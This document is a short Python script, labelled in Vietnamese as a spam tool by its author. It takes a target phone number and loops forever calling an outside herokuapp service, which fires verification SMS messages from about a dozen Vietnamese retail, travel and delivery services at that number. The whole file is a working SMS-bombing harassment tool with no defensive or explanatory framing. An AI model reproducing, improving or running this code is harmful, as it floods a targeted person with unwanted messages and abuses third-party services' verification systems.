
from time import sleep
import requests
stt=0
from time import sleep
import requests
import os, sys, requests, random
import time
from random import choice, randint, shuffle
os.system('clear')
print('\n')
print('==========================')
print('TOOL SPAM BY KHANG PHAN')


print('==========================='+'\n')
phone=input("-> Nhập SĐT (Lưu Ý Bỏ Số 0 Ở Đầu): " )
time_delay = input('-> Time Delay: ')
while True:
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/the-gioi-di-dong?phone={phone}') 
    print( '|',stt,"Thành Công|")    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/nhap-hang-247?phone={phone}')
    print( '|',stt,"Thành Công|")    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/elines?phone={phone}')
    print( '|',stt,"Thành Công|") 
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/meta-vn?phone={phone}')
    print( '|',stt,"Thành Công|")  
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone={phone}')
    print( '|',stt,"Thành Công|" )    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/grab-food?phone={phone}')
    print( '|',stt,"Thành Công|") 
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/tiki?phone={phone}')
    print( '|',stt,"Thành Công|")    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/go2joy?phone={phone}')
    print( '|',stt,"Thành Công|") 
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vntrip?phone={phone}')
    print( '|',stt,"Thành Công|")    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/agoda?phone={phone}')
    print( '|',stt,"Thành Công|")
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vieon?phone=0{phone}')
    print( '|',stt,"Thành Công|")
    for i in range(120, 0):
            print(f"Vui Lòng Đợi {i}\r")
